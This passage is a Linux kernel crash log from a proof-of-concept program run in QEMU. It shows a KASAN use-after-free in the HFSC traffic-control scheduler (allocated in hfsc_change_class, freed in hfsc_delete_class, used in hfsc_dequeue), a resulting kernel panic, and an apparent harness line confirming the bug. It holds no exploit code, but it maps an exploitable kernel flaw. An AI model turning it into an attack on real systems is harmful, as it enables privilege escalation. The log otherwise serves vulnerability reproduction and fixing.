[    1.845515] R10: 0000000000000040 R11: 0000000000000202 R12: 0000000000495d7d
[    1.846834] R13: 000000000047f2d0 R14: 0000000000000000 R15: 0000000000000001
[    1.847933]  </TASK>
[    1.848336] 
[    1.848607] Allocated by task 61:
[    1.849140]  kasan_save_stack+0x33/0x60
[    1.849813]  kasan_set_track+0x25/0x30
[    1.850487]  __kasan_kmalloc+0x8f/0xa0
[    1.851147]  hfsc_change_class+0x54a/0x2e50
[    1.851808]  tc_ctl_tclass+0x3cf/0xf40
[    1.852442]  rtnetlink_rcv_msg+0x35d/0x9d0
[    1.853106]  netlink_rcv_skb+0x12f/0x370
[    1.853797]  netlink_unicast+0x588/0x7f0
[    1.854460]  netlink_sendmsg+0x7b7/0xc60
[    1.855095]  sock_sendmsg+0x13d/0x180
[    1.855676]  __sys_sendto+0x1eb/0x2b0
[    1.856258]  __x64_sys_sendto+0xdb/0x1b0
[    1.856872]  do_syscall_64+0x3b/0x90
[    1.857464]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    1.858357] 
[    1.858610] Freed by task 61:
[    1.859157]  kasan_save_stack+0x33/0x60
[    1.859852]  kasan_set_track+0x25/0x30
[    1.860509]  kasan_save_free_info+0x2b/0x50
[    1.861247]  __kasan_slab_free+0x10a/0x180
[    1.861975]  __kmem_cache_free+0x82/0x1c0
[    1.862715]  hfsc_delete_class+0x44c/0x6f0
[    1.863464]  tc_ctl_tclass+0x9af/0xf40
[    1.864390]  rtnetlink_rcv_msg+0x35d/0x9d0
[    1.865135]  netlink_rcv_skb+0x12f/0x370
[    1.865971]  netlink_unicast+0x588/0x7f0
[    1.866648]  netlink_sendmsg+0x7b7/0xc60
[    1.867346]  sock_sendmsg+0x13d/0x180
[    1.867960]  __sys_sendto+0x1eb/0x2b0
[    1.868585]  __x64_sys_sendto+0xdb/0x1b0
[    1.869381]  do_syscall_64+0x3b/0x90
[    1.869953]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    1.870824] 
[    1.871044] The buggy address belongs to the object at ffff888009fd1800
[    1.871044]  which belongs to the cache kmalloc-1k of size 1024
[    1.873113] The buggy address is located 176 bytes inside of
[    1.873113]  freed 1024-byte region [ffff888009fd1800, ffff888009fd1c00)
[    1.875195] 
[    1.875463] The buggy address belongs to the physical page:
[    1.876398] page:0000000087020219 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9fd0
[    1.877972] head:0000000087020219 order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    1.879315] flags: 0x100000000010200(slab|head|node=0|zone=1)
[    1.880325] page_type: 0xffffffff()
[    1.880962] raw: 0100000000010200 ffff888006441dc0 dead000000000122 0000000000000000
[    1.882332] raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
[    1.883576] page dumped because: kasan: bad access detected
[    1.884607] 
[    1.884907] Memory state around the buggy address:
[    1.885713]  ffff888009fd1780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.886942]  ffff888009fd1800: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.888157] >ffff888009fd1880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.889219]                                      ^
[    1.890084]  ffff888009fd1900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.891123]  ffff888009fd1980: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.892386] ==================================================================
[    1.893646] Disabling lock debugging due to kernel taint
poc: tri[    1g.g9e1r4_8u5af6] general protection fault, probably for non-canonical address 0x6a8005d00000000: 0000 [#1] PREEMPT SMP KASAN NOPTI
[    1.917306] CPU: 0 PID: 61 Comm: poc Tainted: G    B              6.4.0-04322-gc451410ca7e3-dirty #1
[    1.918675] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.920549] RIP: 0010:hfsc_dequeue+0x325/0xf90
: sen[d _ r e q1(.19:271)274] Code: 00 01 eb 3b 48 b8 00 00 00 00 00 fc ff df 48 8d 7b 08 48 89 f9 48 c1 e9 03 80 3c 01 00 0f 85 18 0b 00 00 48 8b 43 08 48 89 df <ff> d0 0f 1f 00 49 89 c7 48 8d 48 28 48 85 c0 0f 84 a1 07 00 00 49
[    1.924348] RSP: 0018:ffffc9000041f438 EFLAGS: 00010286
[    1.925067] RAX: 06a8005d00000000 RBX: ffff888009f81800 RCX: 0000000000000000

[    1.926333] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffff888009f81800
[    1.927546] RBP: ffff888009f81880 R08: 0000000000000001 R09: ffff888009fe2040
[    1.928736] R10: ffff888009fe2080 R11: ffff888009fe20f0 R12: ffff888009fe2000
[    1.929858] R13: ffff888009fd1800 R14: ffff888009fd1898 R15: ffff888009f81880
[    1.930973] FS:  0000000000b55380(0000) GS:ffff88806d200000(0000) knlGS:0000000000000000
[    1.932209] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.932997] CR2: 00007ffea506e964 CR3: 0000000006658000 CR4: 0000000000350ef0
[    1.934323] Call Trace:
[    1.934709]  <TASK>
[    1.935209]  ? die_addr+0x3b/0xa0
[    1.936152]  ? exc_general_protection+0x150/0x220
[    1.936981]  ? asm_exc_general_protection+0x26/0x30
[    1.937844]  ? hfsc_dequeue+0x325/0xf90
[    1.938584]  ? hfsc_dequeue+0x327/0xf90
[    1.939318]  __qdisc_run+0x178/0x1780
[    1.939824]  ? dev_qdisc_enqueue+0x3b/0x140
[    1.940613]  __dev_queue_xmit+0x1952/0x30c0
[    1.941494]  ? selinux_ip_postroute_compat+0x321/0x3d0
[    1.942497]  ? __pfx___dev_queue_xmit+0x10/0x10
[    1.943623]  ? selinux_ip_postroute+0x2ac/0xac0
[    1.944729]  ? __pfx_sock_alloc_send_pskb+0x10/0x10
[    1.945679]  ip_finish_output2+0x6cf/0x18f0
[    1.946429]  ? __pfx_ip_finish_output2+0x10/0x10
[    1.947187]  __ip_finish_output.part.0+0x271/0x950
[    1.947926]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    1.948696]  ? nf_hook_slow+0xa2/0x170
[    1.949347]  ip_output+0x2c7/0x650
[    1.949986]  ? __pfx_ip_output+0x10/0x10
[    1.950590]  ? __pfx_ip_finish_output+0x10/0x10
[    1.951222]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.951951]  ? __pfx_ip_make_skb+0x10/0x10
[    1.952618]  ip_send_skb+0x113/0x150
[    1.953191]  udp_send_skb+0x57d/0x1260
[    1.953950]  udp_sendmsg+0x1757/0x2230
[    1.954593]  ? avc_has_perm_noaudit+0x8a/0x130
[    1.955361]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.956186]  ? __pfx_udp_sendmsg+0x10/0x10
[    1.956964]  ? udp_lib_get_port+0x4b9/0x1850
[    1.957916]  ? ip4_datagram_release_cb+0x161/0x7f0
[    1.958903]  ? __pfx_ip4_datagram_release_cb+0x10/0x10
[    1.959700]  ? __pfx_sk_setsockopt+0x10/0x10
[    1.960836]  ? inet_autobind+0x108/0x160
[    1.961719]  ? inet_send_prepare+0x21f/0x2a0
[    1.963280]  ? __pfx_inet_sendmsg+0x10/0x10
[    1.964572]  ? sock_sendmsg+0x138/0x180
[    1.965315]  sock_sendmsg+0x138/0x180
[    1.965917]  __sys_sendto+0x1eb/0x2b0
[    1.966613]  ? __pfx___sys_sendto+0x10/0x10
[    1.967351]  ? __pfx_udp_push_pending_frames+0x10/0x10
[    1.968260]  ? udp_lib_setsockopt+0x52f/0xc00
[    1.968988]  ? __pfx_udp_lib_setsockopt+0x10/0x10
[    1.969837]  ? __pfx___sys_socket+0x10/0x10
[    1.970512]  ? __pfx_ksys_write+0x10/0x10
[    1.971111]  __x64_sys_sendto+0xdb/0x1b0
[    1.971735]  ? exit_to_user_mode_prepare+0x2a/0x110
[    1.972531]  ? syscall_exit_to_user_mode+0x21/0x50
[    1.973230]  do_syscall_64+0x3b/0x90
[    1.973851]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    1.974674] RIP: 0033:0x43bd43
[    1.975303] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 41 03 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.978610] RSP: 002b:00007ffea5072988 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.980041] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 000000000043bd43
[    1.981456] RDX: 0000000000000000 RSI: 0000000000495d7d RDI: 0000000000000004
[    1.982856] RBP: 0000000000000000 R08: 00007ffea50729a0 R09: 0000000000000010
[    1.984033] R10: 0000000000000040 R11: 0000000000000202 R12: 0000000000495d7d
[    1.985338] R13: 000000000047f2d0 R14: 0000000000000000 R15: 0000000000000001
[    1.986580]  </TASK>
[    1.986976] Modules linked in:
[    1.987597] ---[ end trace 0000000000000000 ]---
[    1.988332] RIP: 0010:hfsc_dequeue+0x325/0xf90
[    1.989108] Code: 00 01 eb 3b 48 b8 00 00 00 00 00 fc ff df 48 8d 7b 08 48 89 f9 48 c1 e9 03 80 3c 01 00 0f 85 18 0b 00 00 48 8b 43 08 48 89 df <ff> d0 0f 1f 00 49 89 c7 48 8d 48 28 48 85 c0 0f 84 a1 07 00 00 49
[    1.992199] RSP: 0018:ffffc9000041f438 EFLAGS: 00010286
[    1.993263] RAX: 06a8005d00000000 RBX: ffff888009f81800 RCX: 0000000000000000
[    1.995567] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffff888009f81800
[    1.997570] RBP: ffff888009f81880 R08: 0000000000000001 R09: ffff888009fe2040
[    1.998909] R10: ffff888009fe2080 R11: ffff888009fe20f0 R12: ffff888009fe2000
[    2.000321] R13: ffff888009fd1800 R14: ffff888009fd1898 R15: ffff888009f81880
[    2.001541] FS:  0000000000b55380(0000) GS:ffff88806d200000(0000) knlGS:0000000000000000
[    2.002980] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.003963] CR2: 00007ffea506e964 CR3: 0000000006658000 CR4: 0000000000350ef0
[    2.005151] Kernel panic - not syncing: Fatal exception in interrupt
[    2.006967] Kernel Offset: disabled
CONFIRMED: KASAN_UAF
